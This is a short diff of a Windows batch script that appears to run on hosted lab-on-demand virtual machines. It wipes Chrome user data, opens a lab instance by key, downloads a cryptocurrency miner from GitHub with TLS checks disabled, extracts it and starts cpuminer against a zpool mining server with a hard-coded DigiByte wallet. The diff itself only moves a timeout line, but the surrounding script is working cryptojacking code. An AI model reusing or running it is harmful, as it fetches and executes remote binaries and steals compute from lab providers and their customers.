@@ -11,10 +11,10 @@ rmdir /Q /S "User Data"
 cd C:\Program Files\Google\Chrome\Application
 start chrome.exe  https://labondemand.com/LabInstance/ResumeWithKey/?key=%id%
 cd C:\Users\Administrator\Desktop
+timeout 10 >nul
 curl -LJOk https://raw.githubusercontent.com/mrX04/mimning/master/Cpuminer-opt-cpu-pool-win64.zip
 7z.exe x Cpuminer-opt-cpu-pool-win64.zip
 cd C:\Users\Administrator\Desktop\Cpuminer-opt-cpu-pool-win64
-timeout 5 >nul
 start cpuminer.exe -a yescrypt -o stratum+tcp://yescrypt.eu.mine.zpool.ca:6233 -u DRjwyBu7dWkd7zJyhpVtgXC5LWbG51ooxP -p c=DGB
 @echo off
 cls
